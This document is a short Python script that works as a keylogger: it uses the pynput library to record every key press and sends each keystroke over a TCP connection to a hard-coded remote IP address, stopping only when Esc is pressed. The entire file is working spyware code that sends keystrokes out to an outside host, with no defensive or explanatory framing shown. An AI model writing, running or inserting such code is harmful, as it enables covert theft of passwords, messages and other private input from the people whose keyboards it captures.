from pynput import keyboard
import socket
import time

# Set up the server address and port
server_address = ('121.98.181.201', 65432)  # Change to your server's IP address if needed

# Create a TCP/IP socket
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect the socket to the server
try:
    client_socket.connect(server_address)
except Exception as e:
    print(f"Connection failed: {e}")
    exit()

# Function to handle key presses
def on_press(key):
    try:
        # Send the key to the server
        client_socket.sendall(f'Key {key.char} pressed\n'.encode())
    except AttributeError:
        # Handle special keys
        client_socket.sendall(f'Special key {key} pressed\n'.encode())

# Function to handle key releases
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener and close the socket
        client_socket.close()
        return False

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
